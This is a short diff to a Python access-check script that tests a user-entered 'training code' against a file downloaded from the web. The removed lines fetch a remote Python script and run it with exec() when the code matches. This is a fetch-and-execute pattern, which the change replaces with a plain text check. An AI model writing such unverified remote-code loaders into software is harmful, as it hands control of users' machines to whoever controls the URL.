@@ -1,18 +1,16 @@
 import urllib.request
-import subprocess
+import sys
 
-# Load the online Python script
-url = "https://bimex-software.github.io/divora-model/generated.py"
+# Load the online text file
+url = "http://divora.freecp.me/dashboard/generated.txt"
 response = urllib.request.urlopen(url)
-python_script = response.read().decode('utf-8')
+data = response.read().decode('utf-8')
 
 # User input
 user_input = input("Enter Training Code: ")
 
-# Check if user input is in the script
-if user_input in python_script:
+if user_input in data:
     print("Access granted")
-    # Execute the Python script
-    exec(python_script)
 else:
     print("Access denied")
+    sys.exit(1)  # Exiting with a non-zero status to indicate an error
